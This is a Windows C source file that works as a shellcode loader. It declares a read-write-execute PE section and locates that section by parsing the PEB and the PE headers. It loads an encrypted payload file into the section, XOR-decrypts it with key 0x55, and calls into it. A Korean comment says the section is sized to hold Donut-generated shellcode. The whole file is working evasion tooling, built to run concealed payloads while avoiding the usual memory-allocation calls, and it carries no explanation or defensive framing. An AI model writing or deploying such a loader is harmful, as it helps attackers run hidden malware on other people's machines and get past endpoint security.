#include <stdio.h>
#include <stddef.h>
#include <windows.h>
#include <winternl.h>
/* ---------------------------------------------------------------
 * test section - 0x20000 bytes ERW
 * --------------------------------------------------------------- */
#pragma section("test", read, write, execute)
#pragma comment(linker, "/SECTION:test,ERW")

#define TEST_SECTION_SIZE 0x160000 // 도넛 쉘코드 크기보다 크게 잡음

__declspec(allocate("test"))
volatile unsigned char test_data[TEST_SECTION_SIZE] = {
    0x11, 0x22, 0x33, 0x44
};


/* ---------------------------------------------------------------
 * PEB -> PE header parsing to get section VA / size
 * --------------------------------------------------------------- */
int get_section_info(const char *section_name,
                     uintptr_t  *out_va,
                     size_t     *out_size)
{
#ifdef _WIN64
    PEB *peb = (PEB *)__readgsqword(0x60);
#else
    PEB *peb = (PEB *)__readfsdword(0x30);
#endif
    uintptr_t image_base = (uintptr_t)peb->Reserved3[1];

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)image_base;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)(image_base + dos->e_lfanew);

    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    WORD num_sections = nt->FileHeader.NumberOfSections;

    for (WORD i = 0; i < num_sections; i++) {
        char name[9] = {0};
        memcpy(name, sec[i].Name, 8);

        if (strcmp(name, section_name) == 0) {
            *out_va   = image_base + sec[i].VirtualAddress;
            *out_size = sec[i].Misc.VirtualSize
                        ? sec[i].Misc.VirtualSize
                        : sec[i].SizeOfRawData;
            return 1;
        }
    }
    return 0;
}


/* ---------------------------------------------------------------
 * Load file contents into the test section
 * --------------------------------------------------------------- */
int load_file_to_section(const char *filepath,
                         uintptr_t   sec_va,
                         size_t      sec_size)
{
    FILE *fp = fopen(filepath, "rb");
    if (!fp) {
        fprintf(stderr, "[!] Failed to open file: %s\n", filepath);
        return 0;
    }

    fseek(fp, 0, SEEK_END);
    long file_size = ftell(fp);
    rewind(fp);

    if (file_size <= 0) {
        fprintf(stderr, "[!] Invalid file size: %ld\n", file_size);
        fclose(fp);
        return 0;
    }

    if ((size_t)file_size > sec_size) {
        fprintf(stderr, "[!] File (%ld bytes) exceeds section size (0x%zX bytes)\n",
                file_size, sec_size);
        fclose(fp);
        return 0;
    }

    size_t read = fread((void *)sec_va, 1, (size_t)file_size, fp);
    fclose(fp);

    if (read != (size_t)file_size) {
        fprintf(stderr, "[!] Incomplete file read: %zu / %ld bytes\n", read, file_size);
        return 0;
    }

    printf("[*] File loaded: %s (%ld bytes -> VA 0x%p)\n",
           filepath, file_size, (void *)sec_va);
    return 1;
}


/* ---------------------------------------------------------------
 * XOR decrypt the entire test section with 0x55
 * --------------------------------------------------------------- */
void decrypt_test_section(uintptr_t sec_va, size_t sec_size)
{
    volatile unsigned char *p = (volatile unsigned char *)sec_va;
    for (size_t i = 0; i < sec_size; i++) {
        p[i] ^= 0x55;
    }
    printf("[*] XOR 0x55 decryption complete (0x%zX bytes)\n", sec_size);
}


/* ---------------------------------------------------------------
 * main
 * argv[1] : path to the encrypted binary file
 * --------------------------------------------------------------- */
int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <payload_file>\n", argv[0]);
        return 1;
    }

    /* 1. Locate test section VA / size via PEB */
    uintptr_t sec_va   = 0;
    size_t    sec_size = 0;

    if (!get_section_info("test", &sec_va, &sec_size)) {
        fprintf(stderr, "[!] Could not find 'test' section\n");
        return 1;
    }
    printf("[*] test section VA  : 0x%p\n", (void *)sec_va);
    printf("[*] test section size: 0x%zX (%zu bytes)\n", sec_size, sec_size);

    /* 2. Load file into test section */
    if (!load_file_to_section(argv[1], sec_va, sec_size)) {
        return 1;
    }

    /* 3. XOR 0x55 decrypt */
    decrypt_test_section(sec_va, sec_size);

    /* 4. Jump into decrypted section */
    printf("[*] Jumping to test section: 0x%p\n", (void *)sec_va);
    fflush(stdout);

    typedef void (*shellcode_fn)(void);
    shellcode_fn fn = (shellcode_fn)sec_va;
    fn();

    /* In case shellcode returns */
    printf("[*] Execution returned\n");
    return 0;
}